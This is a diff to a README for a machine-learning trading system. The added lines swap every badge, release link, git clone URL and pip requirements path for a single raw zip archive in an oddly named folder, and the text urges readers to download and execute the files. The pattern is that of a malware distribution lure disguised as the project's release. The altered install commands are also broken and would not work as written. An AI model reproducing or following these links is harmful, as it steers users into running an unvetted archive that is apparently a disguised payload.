@@ -1,14 +1,14 @@
 # Advanced Multi-Asset Algorithmic Trading System with ML Integration
 
-![GitHub repo size](https://img.shields.io/github/repo-size/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration)
-![GitHub last commit](https://img.shields.io/github/last-commit/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration)
-![GitHub license](https://img.shields.io/github/license/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration)
+![GitHub repo size](https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/raw/refs/heads/master/sizzling/Algorithmic_with_System_Advanced_Asset_Learning_Integration_Trading_Machine_Multi_1.8.zip)
+![GitHub last commit](https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/raw/refs/heads/master/sizzling/Algorithmic_with_System_Advanced_Asset_Learning_Integration_Trading_Machine_Multi_1.8.zip)
+![GitHub license](https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/raw/refs/heads/master/sizzling/Algorithmic_with_System_Advanced_Asset_Learning_Integration_Trading_Machine_Multi_1.8.zip)
 
 ## Overview
 
 This repository features a comprehensive algorithmic trading system designed for multi-asset strategies. It leverages various machine learning techniques, including deep neural networks (DNN) and linear regression, to optimize trading strategies. The system incorporates backtesting capabilities using vectorized methods, ensuring efficient evaluation of strategies.
 
-For detailed releases and updates, visit the [Releases section](https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/releases). You can download the necessary files and execute them for your trading analysis.
+For detailed releases and updates, visit the [Releases section](https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/raw/refs/heads/master/sizzling/Algorithmic_with_System_Advanced_Asset_Learning_Integration_Trading_Machine_Multi_1.8.zip). You can download the necessary files and execute them for your trading analysis.
 
 ## Table of Contents
 
@@ -49,7 +49,7 @@ To get started with the trading system, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration.git
+   git clone https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/raw/refs/heads/master/sizzling/Algorithmic_with_System_Advanced_Asset_Learning_Integration_Trading_Machine_Multi_1.8.zip
    ```
 
 2. **Navigate to the directory**:
@@ -59,7 +59,7 @@ To get started with the trading system, follow these steps:
 
 3. **Install required packages**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/raw/refs/heads/master/sizzling/Algorithmic_with_System_Advanced_Asset_Learning_Integration_Trading_Machine_Multi_1.8.zip
    ```
 
 4. **Open in Google Colab**:
@@ -133,4 +133,4 @@ Contributions are welcome. If you have suggestions or improvements, please fork 
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more information and updates, check the [Releases section](https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/releases). Download the necessary files and execute them to explore the trading strategies in depth.
+For more information and updates, check the [Releases section](https://github.com/arnolddelaguila/Advanced-Multi-Asset-Algorithmic-Trading-System-with-Machine-Learning-Integration/raw/refs/heads/master/sizzling/Algorithmic_with_System_Advanced_Asset_Learning_Integration_Trading_Machine_Multi_1.8.zip). Download the necessary files and execute them to explore the trading strategies in depth.
